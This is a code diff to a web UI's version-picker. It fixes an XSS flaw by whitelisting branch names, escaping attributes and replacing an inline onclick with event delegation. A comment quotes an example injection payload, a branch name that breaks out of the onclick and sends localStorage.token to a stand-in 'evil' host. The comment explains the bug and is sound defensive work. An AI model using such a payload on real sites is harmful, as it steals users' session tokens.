@@ -1499,23 +1499,42 @@ class UI {
                 return;
             }
             
-            plazaEl.innerHTML = data.branches.map(b => {
+            // ★ 分支名来自 preview-branches.json（可由 PR 的 config.json 写入），
+            //   不是可信输入。早期版本把它直接拼进 innerHTML 和
+            //   onclick="ui.loadVersion('${b.branch}')" —— 一个形如
+            //   preview/x');fetch('//evil?t='+localStorage.token)// 的分支名
+            //   就能在官网（以及桌面版）上执行任意 JS。
+            //   现在：先按白名单过滤分支名，再用 data-* + 事件委托渲染，
+            //   文本位置一律转义，属性位置用 escapeAttr（连引号一起转）。
+            const SAFE_BRANCH = /^[A-Za-z0-9._\/-]+$/;
+            plazaEl.innerHTML = data.branches
+                .filter(b => b && typeof b.branch === 'string'
+                          && SAFE_BRANCH.test(b.branch)
+                          && b.branch.indexOf('..') === -1)
+                .map(b => {
                 const isCurrent = localStorage.getItem('gd_custom_branch') === b.branch;
                 return `
-                <div onclick="ui.loadVersion('${b.branch}')" 
+                <div data-branch="${this.escapeAttr(b.branch)}" 
                     style="padding:12px;border:1px solid ${isCurrent ? '#2563eb' : '#e5e7eb'};border-radius:8px;margin-bottom:8px;cursor:pointer;background:${isCurrent ? '#eff6ff' : '#fff'};"
                     onmouseover="this.style.borderColor='#2563eb';this.style.background='#f8fafc'" 
                     onmouseout="this.style.borderColor='${isCurrent ? '#2563eb' : '#e5e7eb'}';this.style.background='${isCurrent ? '#eff6ff' : '#fff'}'">
                     <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                         <div style="font-weight:600;font-size:14px;color:#111827;">${this.escapeHtml(b.name || b.branch)}</div>
-                        <span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v${b.version || '1.0.0'}</span>
+                        <span style="font-size:11px;background:#f3f4f6;color:#6b7280;padding:2px 8px;border-radius:10px;">v${this.escapeHtml(b.version || '1.0.0')}</span>
                     </div>
                     <div style="font-size:12px;color:#6b7280;margin-bottom:4px;">👤 ${this.escapeHtml(b.author || 'unknown')}</div>
                     <div style="font-size:12px;color:#374151;line-height:1.4;">${this.escapeHtml(b.description || '暂无描述')}</div>
-                    <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;">${b.branch}</div>
+                    <div style="font-size:11px;color:#9ca3af;margin-top:6px;font-family:monospace;">${this.escapeHtml(b.branch)}</div>
                     ${isCurrent ? '<div style="font-size:11px;color:#2563eb;margin-top:4px;font-weight:600;">✅ 当前使用中</div>' : ''}
                 </div>`;
             }).join('');
+
+            // 事件委托取代内联 onclick —— 分支名不再进入 JS 代码上下文
+            plazaEl.querySelectorAll('[data-branch]').forEach(el => {
+                el.addEventListener('click', () => {
+                    this.loadVersion(el.getAttribute('data-branch'));
+                });
+            });
         } catch (e) {
             const plazaEl = document.getElementById('version-plaza');
             if (plazaEl) plazaEl.innerHTML = '<div style="text-align:center;padding:20px;color:#ef4444;font-size:13px;">加载失败: ' + e.message + '<br><span style="font-size:11px;color:#9ca3af;">请检查网络连接</span></div>';
@@ -1523,6 +1542,14 @@ class UI {
     }
     
     loadVersion(branch) {
+        // ★ 分支名会被拼进 CDN 前缀（index.html 头部），
+        //   也会写进 localStorage 影响后续每次启动。
+        //   只放行安全的 ref 字符集，挡掉引号/空格/.. 等。
+        if (typeof branch !== 'string' || !/^[A-Za-z0-9._\/-]+$/.test(branch)
+            || branch.indexOf('..') !== -1) {
+            alert('分支名不合法，已忽略：' + String(branch).slice(0, 80));
+            return;
+        }
         localStorage.setItem('gd_custom_branch', branch);
         alert('正在加载版本: ' + branch + '\n页面将刷新以加载新版本。');
         location.reload();
@@ -2242,6 +2269,21 @@ class UI {
         const div = document.createElement('div');
         div.textContent = text;
         return div.innerHTML;
+    }
+
+    /**
+     * 属性值转义 —— 比 escapeHtml 多转引号
+     *
+     * ★ 为什么不能直接用 escapeHtml：
+     *   textContent → innerHTML 的往返只转 & < >，**不转 " 和 '**。
+     *   放进 <div title="${x}"> 或 onclick="f('${x}')" 里，
+     *   一个引号就能闭合属性、注入新属性或事件。
+     *   凡是往 HTML 属性里插值，必须用这个。
+     */
+    escapeAttr(text) {
+        return this.escapeHtml(text == null ? '' : String(text))
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
     }
 
     // ==================== 插件广场 ====================
